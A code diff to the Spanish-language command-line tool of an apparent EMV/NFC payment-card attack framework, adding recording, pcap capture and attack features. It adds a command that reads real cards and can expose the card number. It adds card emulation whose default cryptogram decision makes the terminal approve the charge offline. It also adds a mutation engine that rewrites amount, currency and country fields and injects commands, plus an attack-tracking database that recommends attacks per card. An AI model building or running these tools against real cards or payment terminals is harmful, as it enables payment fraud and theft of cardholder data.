@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import argparse
 import sys
+from datetime import datetime
 
 from . import __version__
 from . import poc as pocmod
@@ -33,6 +34,15 @@ from .term import c
 # ---------------------------------------------------------------------------
 # Apertura de lector / perfil de terminal
 # ---------------------------------------------------------------------------
+# Recorders vivos creados por `-R/--record` (ver `open_reader`). Se guardan al
+# terminar el comando, en `main()` — es la forma de mínima invasión: los
+# handlers siguen usando `with open_reader(args) as r` sin cambios.
+_ACTIVE_RECORDERS: list = []
+# Taps pcap vivos creados por `-P/--pcap` (ver `open_reader`); se cierran al
+# terminar el comando, en `main()`.
+_ACTIVE_TAPS: list = []
+
+
 def open_reader(args):
     dev = registry.resolve(getattr(args, "reader", None))
     on_event = None
@@ -40,8 +50,34 @@ def open_reader(args):
         def on_event(e):
             print(c(f"  >> {e.command}", "grey"))
             print(c(f"  << {e.response}  [{e.sw}]", "grey"))
-    return registry.open_device(dev, protocol=getattr(args, "protocol", "any"),
-                                on_event=on_event)
+    reader = registry.open_device(dev, protocol=getattr(args, "protocol", "any"),
+                                  on_event=on_event)
+    if getattr(args, "pcap", None):
+        # volcado pcap en streaming: se envuelve el Transceiver lógico (1 evento
+        # = 1 intercambio, ya sin 61xx/6Cxx) y se cierra al terminar el comando
+        # (ver `_close_pcap_taps`).
+        from dataclasses import replace
+        from .core.pcap import PcapTap
+        tap = PcapTap(args.pcap)
+        if reader.transceive is not None:
+            reader = replace(reader, transceive=tap.wrap(reader.transceive))
+        _ACTIVE_TAPS.append(tap)
+    if getattr(args, "record", False):
+        # grabación estructurada: se envuelve el Transceiver lógico (1 evento
+        # = 1 intercambio lógico, ya sin 61xx/6Cxx) y se difiere el disco a
+        # `main()` (ver `_ACTIVE_RECORDERS`).
+        from dataclasses import replace
+        from .session.recorder import SessionRecorder
+        recorder = SessionRecorder(store.active_project(), reader=dev.name)
+        if reader.atr is not None:
+            try:
+                recorder.set_atr(reader.atr())
+            except Exception:
+                pass
+        if reader.transceive is not None:
+            reader = replace(reader, transceive=recorder.wrap(reader.transceive))
+        _ACTIVE_RECORDERS.append(recorder)
+    return reader
 
 
 def current_profile() -> dict:
@@ -454,7 +490,16 @@ def cmd_fuzz_ndef(args) -> int:
         print(c(f"Emulando tag NDEF [{label}] ({len(hexmsg)//2} bytes)… "
                 "acerca un lector NFC (Ctrl-C para detener).", "yellow"))
 
+        tap = None
+        if getattr(args, "pcap", None):
+            # la emulación no pasa APDUs por el host: el intercambio lo hace
+            # el firmware y se reconstruye desde sus líneas EMU:RX/EMU:TX.
+            from .core.pcap import PcapTap
+            tap = PcapTap(args.pcap)
+
         def _show(line: str) -> None:
+            if tap is not None:
+                tap.record_wire_line(line)
             if line.startswith("EMU:MSG-SENT"):
                 col = "green"
             elif line.startswith("EMU:RX"):
@@ -471,6 +516,11 @@ def cmd_fuzz_ndef(args) -> int:
             bombercat.ndef_emulate(tgt, hexmsg, timeout=None, on_line=_show)
         except KeyboardInterrupt:
             print("\ninterrumpido (STOP enviado).")
+        finally:
+            if tap is not None:
+                tap.close()
+                print(c(f"pcap guardado: {tap.path} ({tap.exchanges} intercambio(s))",
+                        "green"))
         return 0
     return 1
 
@@ -1156,6 +1206,30 @@ def cmd_bombercat(args) -> int:
                 f"exp {info.get('exp','?')}", "green"))
         print(c("Ahora: emvy bombercat emv-emulate --ram (acerca el terminal).", "grey"))
         return 0
+    if args.action == "probe-card":
+        print(c("PROBE-CARD — acerca la tarjeta REAL (solo lectura; la salida puede "
+                "contener el PAN real, no la compartas tal cual)…", "yellow"))
+        try:
+            out = bombercat.probe_card(
+                tgt, amount_cents=getattr(args, "amount", 0),
+                country=getattr(args, "country", "0484"),
+                currency=getattr(args, "currency", None),
+                wait_s=getattr(args, "wait", 60),
+                on_line=lambda l: print(c(f"  {l}", "grey")))
+        except ReaderError as e:
+            print(c(str(e), "red"))
+            return 1
+        print()
+        for k in ("ppse", "aid", "fci", "pdol", "gpo", "aip", "afl"):
+            v = out.get(k)
+            if v:
+                print(f"{c(k.upper(), 'bold'):>8}: {v}")
+        if out.get("sw"):
+            print(c(f"   ATENCIÓN: el GPO devolvió SW {out['sw']} (p.ej. 6985 = la tarjeta "
+                    "no coopera con este PDOL/contexto).", "yellow"))
+        for cmd, resp in out.get("records", []):
+            print(f"{c('RECORD', 'bold'):>8} [{cmd}]:\n           {resp}")
+        return 0
     if args.action == "emv-emulate":
         card = None
         if getattr(args, "ram", False):
@@ -1173,8 +1247,22 @@ def cmd_bombercat(args) -> int:
                     f"AID {card.aid or '?'}", "grey"))
         print(c("Emulando una TARJETA EMV para perfilar el terminal… acerca el "
                 "lector/POS (Ctrl-C para detener).", "yellow"))
+        cid = getattr(args, "cid", "40")
+        print(c(f"Decisión de criptograma: cid={cid} ("
+                + {"40": "TC — aprueba offline, el cobro completa",
+                   "80": "ARQC — el terminal intenta ir online",
+                   "00": "AAC — declina"}.get(cid, cid) + ")", "grey"))
+
+        tap = None
+        if getattr(args, "pcap", None):
+            # la emulación no pasa APDUs por el host: el intercambio lo hace
+            # el firmware y se reconstruye desde sus líneas EMU:RX/EMU:TX.
+            from .core.pcap import PcapTap
+            tap = PcapTap(args.pcap)
 
         def _show(line: str) -> None:
+            if tap is not None:
+                tap.record_wire_line(line)
             if line.startswith("EMU:RX SELECT-PPSE"):
                 col = "bold cyan"
             elif line.startswith("EMU:RX SELECT-AID"):
@@ -1193,9 +1281,14 @@ def cmd_bombercat(args) -> int:
 
         try:
             bombercat.emv_emulate(tgt, card=card, from_ram=getattr(args, "ram", False),
-                                  timeout=None, on_line=_show)
+                                  cid=cid, timeout=None, on_line=_show)
         except KeyboardInterrupt:
             print("\ninterrumpido (STOP enviado).")
+        finally:
+            if tap is not None:
+                tap.close()
+                print(c(f"pcap guardado: {tap.path} ({tap.exchanges} intercambio(s))",
+                        "green"))
         return 0
     return 1
 
@@ -1380,6 +1473,394 @@ def cmd_poc(args) -> int:
 
 
 # ---------------------------------------------------------------------------
+# Comandos: mutations (motor de mutaciones EMV + playbooks COMBO)
+# ---------------------------------------------------------------------------
+def cmd_mutations(args) -> int:
+    """Motor de mutaciones EMV y playbooks COMBO: lista, detalle y ejecución
+    offline (diff sobre una captura) o en vivo (flujo corto con el send
+    envuelto por `mutations.mutating`)."""
+    from .core import mutations
+    from .core.playbooks import get_playbook, playbooks as all_playbooks
+
+    if args.action == "list":
+        print(c("Familias de mutaciones:", "bold"))
+        familias = [
+            ("pdol", "reescribe campos del PDOL en el GPO (80 A8): 9F02 importe, "
+                     "5F2A divisa, 9F1A país, 9F66 TTQ"),
+            ("afl", "muta el tag 94 (AFL) de la respuesta GPO: skip_signed, truncate, "
+                    "remove_sfi, extend"),
+            ("dol", "muta CDOL1 (8C) / CDOL2 (8D) en registros: remove_field, truncate"),
+            ("response", "TLV de respuesta: replace | delete | splice | xor | flip_bit | "
+                         "prepend | append, limitable por on_ins"),
+            ("injections", "APDUs extra hacia la tarjeta; la respuesta se anota pero "
+                           "jamás se reenvía al terminal"),
+        ]
+        for fid, desc in familias:
+            print(f"  {c(fid, 'cyan'):<12} {desc}")
+        print()
+        print(c("Playbooks COMBO:", "bold"))
+        for pb in all_playbooks():
+            print(f"  {c(pb['id'], 'cyan'):<9} {c(pb['title'], 'bold')}")
+            print(f"    {c(pb['description'], 'grey')}")
+        return 0
+
+    pb = get_playbook(getattr(args, "id", None) or getattr(args, "combo", None))
+    if not pb:
+        print(c(f"Playbook desconocido. Usa 'emvy mutations list'.", "red"))
+        return 1
+
+    if args.action == "show":
+        config = mutations.MutationConfig.from_dict(pb["config"])
+        print(c(f"{pb['id']} — {pb['title']}", "bold"))
+        print(c(pb["description"], "grey"))
+        refs = ", ".join(pb["attack_ref"])
+        print(f"  referencias: {c(refs, 'yellow')}")
+        print(c("Reglas activadas:", "bold"))
+        for familia in ("pdol", "afl", "dol", "response", "injections"):
+            for m in getattr(config, familia):
+                if not m.enabled:
+                    continue
+                d = m.to_dict()
+                detalle = " ".join(f"{k}={v}" for k, v in d.items()
+                                   if k not in ("enabled", "comment") and v not in ("", b"", [], (), None))
+                print(f"  {c(familia, 'cyan'):<12} {detalle}")
+                if m.comment:
+                    print(f"    {c(m.comment, 'grey')}")
+        plan = mutations.planned_injections(config)
+        if plan:
+            print(c("Inyecciones planificadas:", "bold"))
+            for line in plan:
+                print(f"  {c(line, 'yellow')}")
+        return 0
+
+    if args.action == "run":
+        config = mutations.MutationConfig.from_dict(pb["config"])
+        if args.file or args.capture:
+            # modo offline: diff de la captura atravesando el motor
+            from pathlib import Path
+            path = Path(args.file) if args.file else None
+            if path is None:
+                proj = store.active_project()
+                if not proj:
+                    print(c("No hay proyecto activo para --capture. Usa 'emvy project use'.", "red"))
+                    return 1
+                fname = args.capture if args.capture.endswith(".json") else args.capture + ".json"
+                path = proj.captures_dir / fname
+            if not path.exists():
+                print(c(f"No existe la captura: {path}", "red"))
+                return 1
+            dump = CardDump.from_json(path.read_text())
+            print(c(f"{pb['id']} — {pb['title']}", "bold"),
+                  c(f"sobre captura {path.name}", "grey"))
+            for line in mutations.preview_dump(dump, config):
+                color = "green" if "→" in line else ("yellow" if "planificada" in line
+                                                     else "cyan")
+                print(c(line, color))
+            for line in mutations.planned_injections(config):
+                print(c(line, "yellow"))
+            return 0
+
+        # modo live: flujo corto con el send envuelto por mutating()
+        exchanges = []
+
+        def _on_event(ev):
+            exchanges.append(ev)
+
+        with open_reader(args) as r:
+            send = mutations.mutating(_send_of(r), config, on_event=_on_event)
+            print(c(f"{pb['id']} — {pb['title']} (en vivo)", "bold"))
+            print(c("Flujo: discover → select → GPO → registros AFL", "grey"))
+            apps = emv.discover(send, brute=False)
+            if not apps:
+                print(c("No se encontraron aplicaciones.", "red"))
+                return 1
+            app = emv.select_application(send, apps[0].aid)
+            _, app = emv.get_processing_options(send, app, current_profile())
+            app = emv.read_afl_records(send, app)
+        for ev in exchanges:
+            tag = "MUT" if ev.modified else "emv"
+            print(f"  {c(tag, 'yellow' if ev.modified else 'grey')} "
+                  f"{c(str(ev.cmd_before), 'cyan')}")
+            if ev.cmd_after != ev.cmd_before:
+                print(f"    {c('cmd → ' + str(ev.cmd_after), 'magenta')}")
+            print(f"    {c('resp', 'green')} [{ev.resp_after.sw_hex}] "
+                  f"{to_hex(ev.resp_after.data) or '(vacío)'}")
+            for note in ev.notes:
+                print(f"    {c('· ' + note, 'yellow')}")
+        for line in mutations.planned_injections(config):
+            print(c("  " + line, "grey"))
+        return 0
+    return 1
+
+
+# ---------------------------------------------------------------------------
+# Comandos: log (sesiones grabadas, replay y conversión de formatos)
+# ---------------------------------------------------------------------------
+def _find_session(sid: str):
+    """Localiza una sesión por subcadena del sid en el proyecto activo."""
+    from .session.recorder import list_sessions, load_session
+    proj = store.active_project()
+    if not proj:
+        print(c("No hay proyecto activo. Usa 'emvy project use <nombre>'.", "red"))
+        return None, None
+    for path in list_sessions(proj):
+        if sid.lower() in path.stem.lower():
+            return proj, load_session(path)
+    print(c(f"No hay sesión que coincida con {sid!r} en el proyecto {proj.name!r}.",
+            "red"))
+    return proj, None
+
+
+def cmd_log(args) -> int:
+    """Sesiones APDU grabadas (`-R/--record`): lista, visor, replay y conversión."""
+    from .core import apduprint, sessionlog
+    from .session.recorder import list_sessions, load_session
+
+    if args.action == "list":
+        proj = store.active_project()
+        if not proj:
+            print(c("No hay proyecto activo. Usa 'emvy project use <nombre>'.", "red"))
+            return 1
+        paths = list_sessions(proj)
+        if not paths:
+            print(c(f"El proyecto {proj.name!r} no tiene sesiones grabadas "
+                    f"(usa 'emvy -R <comando>' con un lector).", "yellow"))
+            return 1
+        print(c(f"Sesiones de {proj.name!r}:", "bold"))
+        for path in paths:
+            s = load_session(path)
+            n_crypto = len(sessionlog.extract_cryptograms(s))
+            print(f"  {c(s.sid, 'cyan')}  {c(s.started or '?', 'grey')}"
+                  f"  {len(s.exchanges):>3} intercambios"
+                  + (f"  {c(str(n_crypto) + ' criptograma(s)', 'yellow')}"
+                     if n_crypto else ""))
+        return 0
+
+    if args.action == "show":
+        _, s = _find_session(args.sid)
+        if s is None:
+            return 1
+        print(c(f"Sesión {s.sid}", "bold")
+              + c(f"  inicio={s.started or '?'}"
+                  + (f"  cierre={s.closed}" if s.closed else "  (sin cerrar)")
+                  + (f"  lector={s.reader}" if s.reader else "")
+                  + (f"  ATR={s.atr}" if s.atr else ""), "grey"))
+        for i, ex in enumerate(s.exchanges):
+            cat = apduprint.sw_category(ex.response.sw1, ex.response.sw2)
+            color = "green" if cat == "ok" else ("yellow" if cat in ("warning", "info")
+                                                 else "red")
+            print(c(f"── #{i + 1}  {ex.t_ms:8.1f} ms ", "grey")
+                  + c(f"[{ex.response.sw_hex}]", color))
+            print(apduprint.format_exchange(ex))
+        return 0
+
+    if args.action == "replay":
+        _, s = _find_session(args.sid)
+        if s is None:
+            return 1
+        from .session.recorder import replay_session
+        plan = sessionlog.replay_plan(s)
+        print(c(f"Replay de la sesión {s.sid}: {len(plan)} comandos", "bold"))
+        print(c("Aviso: los tags criptográficos (9F26/9F36 ATC…) legítimamente "
+                "difieren entre ejecuciones (contador e impredecible nuevos).",
+                "grey"))
+        with open_reader(args) as r:
+            send = _send_of(r)
+            new_exchanges = replay_session(s, send)
+        for old, new in zip(s.exchanges, new_exchanges):
+            same_sw = (old.response.sw1, old.response.sw2) == (new.response.sw1,
+                                                               new.response.sw2)
+            same_data = old.response.data == new.response.data
+            mark = c("=", "green") if (same_sw and same_data) \
+                else (c("~", "yellow") if same_sw else c("!", "red"))
+            print(f"  {mark} {apduprint.format_command(old.command).splitlines()[0]}")
+            print(c(f"    original: SW {old.response.sw_hex} "
+                    f"{to_hex(old.response.data) or '(vacío)'}", "grey"))
+            print((c("    nueva:    SW ", "grey") if same_sw else
+                   c("    nueva:    SW ", "yellow"))
+                  + c(f"{new.response.sw_hex} {to_hex(new.response.data) or '(vacío)'}",
+                      "green" if same_sw else "yellow"))
+        return 0
+
+    if args.action == "convert":
+        from pathlib import Path
+        path = Path(args.file)
+        if not path.exists():
+            print(c(f"No existe el fichero: {path}", "red"))
+            return 1
+        text = path.read_text(encoding="utf-8")
+        from_fmt = sessionlog.detect_format(text)
+        to_fmt = {"hexlog": "hexlog", "json": "session-json"}[args.to]
+        if from_fmt == to_fmt:
+            print(c(f"El fichero ya está en formato {args.to}; no hay nada que "
+                    "convertir.", "yellow"))
+            return 1
+        try:
+            print(sessionlog.convert(text, from_fmt, to_fmt))
+        except (ValueError, KeyError) as e:
+            print(c(f"Conversión fallida: {e}", "red"))
+            return 1
+        return 0
+    return 1
+
+
+# ---------------------------------------------------------------------------
+# Comandos: fingerprint + intel (identidad estable e inteligencia cross-session)
+# ---------------------------------------------------------------------------
+def cmd_fingerprint(args) -> int:
+    """Fingerprinting normalizado: perfil estable + hash SHA-256 de la tarjeta.
+    Con proyecto activo registra la tarjeta en la intel DB del proyecto."""
+    from .core import fingerprint
+    from .project.inteldb import IntelDB
+
+    dump = _load_or_capture(args)
+    profile = fingerprint.profile_from_dump(dump, getattr(args, "aid", None))
+    if profile is None:
+        print(c("La captura no tiene datos de aplicación para perfilar.", "red"))
+        return 1
+
+    print(c(f"═══ Fingerprint — AID {profile.aid} ({profile.scheme or '?'}) ═══", "bold"))
+    for line in fingerprint.summary_lines(profile):
+        print(f"  {line}")
+
+    if args.output:
+        import json as _json
+        with open(args.output, "w") as f:
+            _json.dump(fingerprint.profile_to_dict(profile), f, indent=2,
+                       ensure_ascii=False)
+        print(c(f"Perfil guardado en {args.output}", "green"))
+
+    proj = store.active_project()
+    if proj is None:
+        print(c("Sin proyecto activo: no se registró en la intel DB "
+                "(usa 'emvy project use <nombre>').", "grey"))
+        return 0
+    try:
+        with IntelDB(proj) as db:
+            row = db.upsert_card(profile)
+            primera = datetime.fromtimestamp(row.first_seen).strftime("%Y-%m-%d %H:%M:%S")
+            veces = "vez" if row.times_seen == 1 else "veces"
+            print(c(f"Tarjeta vista {row.times_seen} {veces} en el proyecto "
+                    f"{proj.name}; primera vez el {primera}.", "green"))
+    except Exception as e:
+        print(c(f"No se pudo registrar en la intel DB: {e}", "red"))
+    return 0
+
+
+def _find_intel_card(db, prefix: str):
+    """Localiza una tarjeta por hash completo o prefijo (error limpio si no)."""
+    row = db.get_card(prefix) or db.find_card(prefix)
+    if row is None:
+        print(c(f"No hay tarjeta que coincida con {prefix!r} en este proyecto.", "red"))
+    return row
+
+
+def cmd_intel(args) -> int:
+    """Inteligencia cross-session del proyecto: tarjetas vistas, outcomes,
+    notas, recomendaciones y patrones entre tarjetas."""
+    from .core import fingerprint
+    from .project.inteldb import IntelDB
+
+    proj = store.active_project()
+    if not proj:
+        print(c("No hay proyecto activo. Usa 'emvy project use <nombre>'.", "red"))
+        return 1
+
+    with IntelDB(proj) as db:
+        action = args.action
+        if action == "list":
+            cards = db.list_cards()
+            if not cards:
+                print(c(f"El proyecto {proj.name!r} no tiene tarjetas registradas "
+                      f"(usa 'emvy fingerprint' con una tarjeta).", "yellow"))
+                return 0
+            print(c(f"Tarjetas del proyecto {proj.name!r}:", "bold"))
+            for r in cards:
+                nota = f"  {c(r.notes[:60], 'grey')}" if r.notes else ""
+                print(f"  {c(r.hash[:12], 'cyan')}  {r.profile.scheme or '?':<10} "
+                      f"vista {r.times_seen}x  "
+                      f"última {datetime.fromtimestamp(r.last_seen):%Y-%m-%d %H:%M}"
+                      f"{nota}")
+            return 0
+
+        if action == "show":
+            row = _find_intel_card(db, args.hash)
+            if row is None:
+                return 1
+            print(c(f"═══ {row.hash[:16]}…  ({row.profile.scheme or '?'}) ═══", "bold"))
+            print(f"  vista {row.times_seen}x · primera "
+                  f"{datetime.fromtimestamp(row.first_seen):%Y-%m-%d %H:%M} · "
+                  f"última {datetime.fromtimestamp(row.last_seen):%Y-%m-%d %H:%M}")
+            if row.notes:
+                print(f"  nota: {row.notes}")
+            print(c("  ── perfil ──", "bold", "cyan"))
+            for line in fingerprint.summary_lines(row.profile):
+                print(f"    {line}")
+            outcomes = db.outcomes_for(row.hash)
+            print(c(f"  ── outcomes ({len(outcomes)}) ──", "bold", "cyan"))
+            if not outcomes:
+                print(c("    (sin ataques registrados; 'emvy intel record …')", "grey"))
+            for o in outcomes:
+                col = {"success": "green", "partial": "yellow"}.get(o.result, "red")
+                print(f"    {c(o.attack_id, 'cyan')}  {c('[' + o.result + ']', col)}"
+                      + (f"  {o.notes}" if o.notes else ""))
+            return 0
+
+        if action == "note":
+            row = _find_intel_card(db, args.hash)
+            if row is None:
+                return 1
+            db.set_note(row.hash, args.text)
+            print(c("Nota guardada.", "green"))
+            return 0
+
+        if action == "record":
+            row = _find_intel_card(db, args.hash)
+            if row is None:
+                return 1
+            try:
+                db.add_outcome(row.hash, args.attack, args.result,
+                               notes=getattr(args, "notes", "") or "")
+            except ValueError as e:
+                print(c(str(e), "red"))
+                return 1
+            print(c(f"Outcome registrado: {args.attack.upper()} → {args.result} "
+                    f"({row.hash[:12]}…).", "green"))
+            return 0
+
+        if action == "recommend":
+            row = _find_intel_card(db, args.hash)
+            if row is None:
+                return 1
+            recs = db.recommend_for(row.hash)
+            if not recs:
+                print(c("Sin recomendaciones (¿tarjeta sin perfil?).", "yellow"))
+                return 0
+            print(c(f"Recomendaciones para {row.hash[:12]}…:", "bold"))
+            for i, r in enumerate(recs, 1):
+                extra = ""
+                if r.requires_relay:
+                    extra = c("  [requiere relay NFC — EMVy aún no lo integra]", "yellow")
+                if r.combo:
+                    extra += c(f"  ({r.combo})", "grey")
+                print(f"  {i}. {c(r.attack_id, 'cyan')} {r.title}\n"
+                      f"     {c(r.reason, 'grey')}{extra}")
+            return 0
+
+        if action == "patterns":
+            lines = db.patterns()
+            if not lines:
+                print(c("Sin datos suficientes: se necesitan outcomes en 2+ tarjetas.",
+                        "yellow"))
+                return 0
+            print(c("Patrones cross-card:", "bold"))
+            for line in lines:
+                print(f"  {line}")
+            return 0
+    return 1
+
+
+# ---------------------------------------------------------------------------
 # Parser
 # ---------------------------------------------------------------------------
 def build_parser() -> argparse.ArgumentParser:
@@ -1392,6 +1873,14 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("-r", "--reader", help="lector por índice, nombre, backend o id (subcadena)")
     p.add_argument("-p", "--protocol", default="any", choices=["t0", "t1", "any"])
     p.add_argument("-v", "--verbose", action="store_true", help="traza cada APDU")
+    p.add_argument("-R", "--record", action="store_true",
+                   help="graba la sesión APDU estructurada en el proyecto activo "
+                        "(sessions/*.json + sessions.hexlog + cryptograms.jsonl)")
+    p.add_argument("-P", "--pcap", metavar="PATH",
+                   help="graba todo el tráfico APDU de la operación en un .pcap "
+                        "(linktype ISO 14443, abre directo en Wireshark); también "
+                        "captura las emulaciones NDEF/EMV (tráfico reconstruido "
+                        "desde los reportes del firmware)")
     sub = p.add_subparsers(dest="cmd", required=True)
 
     sub.add_parser("readers", help="lista lectores (todos los backends)").set_defaults(func=cmd_readers)
@@ -1654,12 +2143,26 @@ def build_parser() -> argparse.ArgumentParser:
     bsub.add_parser("cardscan",
                     help="lee una tarjeta EMV por NFC y la guarda en la RAM del BomberCat"
                     ).set_defaults(func=cmd_bombercat)
+    q = bsub.add_parser("probe-card",
+                        help="lee una tarjeta real con el flujo de un terminal (PPSE→AID→"
+                             "GPO dinámico→registros) y vuelca respuestas crudas. "
+                             "SOLO LECTURA; la salida puede contener el PAN real — no la "
+                             "compartas tal cual")
+    q.add_argument("--amount", type=int, default=0, help="monto en centavos para el PDOL")
+    q.add_argument("--country", default="0484", help="código de país (hex BCD, p.ej. 0484)")
+    q.add_argument("--currency", help="divisa (default: la de --country)")
+    q.add_argument("--wait", type=int, default=60, help="segundos esperando la tarjeta")
+    q.set_defaults(func=cmd_bombercat)
     q = bsub.add_parser("emv-emulate",
                         help="emula una tarjeta EMV para perfilar/fuzzear un terminal de pago")
     q.add_argument("--card", help="captura (CardDump/JSON de BomberCat) para presentar sus "
                    "datos reales; sin esto usa una Visa de prueba")
     q.add_argument("--ram", action="store_true",
                    help="emula la tarjeta guardada en la RAM del firmware (tras 'cardscan')")
+    q.add_argument("--cid", default="40", choices=["40", "80", "00"],
+                   help="decisión de criptograma de la tarjeta emulada: 40=TC aprueba "
+                        "OFFLINE y el cobro completa (default), 80=ARQC el terminal intenta "
+                        "ir online (el cobro se cuelga), 00=AAC declina")
     q.set_defaults(func=cmd_bombercat)
     # --- puente al framework bombercat-tools (vendorizado) ---
     bsub.add_parser("setup", help="prepara bombercat-tools (venv del framework)").set_defaults(func=cmd_bombercat_bridge)
@@ -1703,10 +2206,104 @@ def build_parser() -> argparse.ArgumentParser:
     q.add_argument("--allow-write", action="store_true", help="permite métodos HTTP no idempotentes")
     q.set_defaults(func=cmd_poc)
 
+    # mutations (motor de mutaciones EMV + playbooks COMBO)
+    sp = sub.add_parser("mutations", help="motor de mutaciones EMV + playbooks COMBO")
+    msub = sp.add_subparsers(dest="action", required=True)
+    msub.add_parser("list", help="familias de mutaciones + playbooks COMBO").set_defaults(func=cmd_mutations)
+    q = msub.add_parser("show", help="detalle de un playbook (reglas, comentarios, inyecciones)")
+    q.add_argument("id", help="id del playbook (p.ej. COMBO-A)"); q.set_defaults(func=cmd_mutations)
+    q = msub.add_parser("run", help="aplica un playbook: offline (diff de captura) o en vivo (-r)")
+    q.add_argument("combo", help="id del playbook (p.ej. COMBO-A)")
+    q.add_argument("--file", help="captura JSON (CardDump) para modo offline")
+    q.add_argument("--capture", help="nombre de captura del proyecto activo (modo offline)")
+    q.set_defaults(func=cmd_mutations)
+
+    # log (sesiones APDU grabadas con -R/--record)
+    sp = sub.add_parser("log", help="sesiones APDU grabadas: lista, visor, replay, conversión")
+    lsub = sp.add_subparsers(dest="action", required=True)
+    lsub.add_parser("list", help="lista las sesiones del proyecto activo").set_defaults(func=cmd_log)
+    q = lsub.add_parser("show", help="visor de una sesión con el APDU printer")
+    q.add_argument("sid", help="sid (o subcadena) de la sesión"); q.set_defaults(func=cmd_log)
+    q = lsub.add_parser("replay", help="reenvía los comandos de la sesión a una tarjeta")
+    q.add_argument("sid", help="sid (o subcadena) de la sesión"); q.set_defaults(func=cmd_log)
+    q = lsub.add_parser("convert", help="convierte entre hexlog y session-json (offline)")
+    q.add_argument("file", help="fichero a convertir (.hexlog o .json)")
+    q.add_argument("--to", choices=["hexlog", "json"], required=True,
+                   help="formato de salida"); q.set_defaults(func=cmd_log)
+
+    # fingerprint (perfil normalizado + hash estable de la tarjeta)
+    sp = sub.add_parser("fingerprint",
+                        help="perfil normalizado + hash SHA-256 (tarjeta o --file captura)")
+    sp.add_argument("-o", "--output", help="guarda el perfil JSON en este archivo")
+    sp.add_argument("--file", help="calcular desde un dump JSON en vez de la tarjeta")
+    sp.add_argument("--aid", help="AID a perfilar (por defecto: el primero de la captura)")
+    sp.add_argument("--no-brute", action="store_true")
+    sp.add_argument("--no-sweep", action="store_true")
+    sp.add_argument("--no-getdata", action="store_true")
+    sp.set_defaults(func=cmd_fingerprint)
+
+    # intel (inteligencia cross-session del proyecto)
+    sp = sub.add_parser("intel", help="inteligencia de tarjetas del proyecto (intel.db)")
+    isub = sp.add_subparsers(dest="action", required=True)
+    isub.add_parser("list", help="tarjetas vistas en el proyecto").set_defaults(func=cmd_intel)
+    q = isub.add_parser("show", help="perfil + historial de outcomes de una tarjeta")
+    q.add_argument("hash", help="hash (o prefijo) de la tarjeta"); q.set_defaults(func=cmd_intel)
+    q = isub.add_parser("note", help="fija la nota de una tarjeta")
+    q.add_argument("hash"); q.add_argument("text"); q.set_defaults(func=cmd_intel)
+    q = isub.add_parser("record", help="registra el outcome de un ataque contra una tarjeta")
+    q.add_argument("hash", help="hash (o prefijo) de la tarjeta")
+    q.add_argument("--attack", required=True,
+                   help="id del ataque (ATTACK-1…ATTACK-11; ver 'intel show'/'mutations list')")
+    q.add_argument("--result", required=True,
+                   choices=["success", "partial", "failed", "blocked", "error"])
+    q.add_argument("--notes", default="", help="nota libre sobre el resultado")
+    q.set_defaults(func=cmd_intel)
+    q = isub.add_parser("recommend", help="top-5 de ataques recomendados para una tarjeta")
+    q.add_argument("hash", help="hash (o prefijo) de la tarjeta"); q.set_defaults(func=cmd_intel)
+    isub.add_parser("patterns", help="patrones cross-card (SW/resultados repetidos)"
+                     ).set_defaults(func=cmd_intel)
+
     sub.add_parser("shell", help="shell interactivo").set_defaults(func=cmd_shell)
     sub.add_parser("tui", help="interfaz TUI (Textual)").set_defaults(func=cmd_tui)
     sub.add_parser("gui", help="interfaz GUI de escritorio (PySide6/Qt)").set_defaults(func=cmd_gui)
     return p
+
+
+def _close_pcap_taps() -> None:
+    """Cierra los taps pcap activos (`-P/--pcap`) y confirma la ruta escrita.
+
+    Corre al terminar el comando (éxito, error o Ctrl-C): cada comando abre y
+    cierra su lector dentro del handler, así que aquí todo lo grabado ya está
+    completo.
+    """
+    if not _ACTIVE_TAPS:
+        return
+    for tap in _ACTIVE_TAPS:
+        tap.close()
+        print(c(f"pcap guardado: {tap.path} ({tap.exchanges} intercambio(s))", "green"))
+        if tap.error:
+            print(c(f"aviso: el pcap tuvo un error de escritura: {tap.error}", "yellow"))
+    _ACTIVE_TAPS.clear()
+
+
+def _flush_recorders() -> None:
+    """Guarda las sesiones de los recorders activos (`-R/--record`) y avisa.
+
+    Corre al terminar el comando (éxito, error o Ctrl-C): cada comando abre y
+    cierra su lector dentro del handler, así que aquí todo lo grabado ya está
+    completo. Sin proyecto activo no se escribió nada: aviso en gris.
+    """
+    if not _ACTIVE_RECORDERS:
+        return
+    for recorder in _ACTIVE_RECORDERS:
+        paths = recorder.save_all()
+        for p in paths:
+            print(c(f"sesión guardada: {p}", "green"))
+        if not paths:
+            print(c(f"grabación no guardada: {len(recorder.pending)} sesión(es) "
+                    "en memoria (sin proyecto activo). Activa uno con "
+                    "'emvy project use <nombre>' y repite.", "grey"))
+    _ACTIVE_RECORDERS.clear()
 
 
 def main(argv=None) -> int:
@@ -1725,6 +2322,9 @@ def main(argv=None) -> int:
         except KeyboardInterrupt:
             print("\ninterrumpido.")
             return 130
+        finally:
+            _flush_recorders()
+            _close_pcap_taps()
     finally:
         if started_pcscd:
             pcscd.stop()
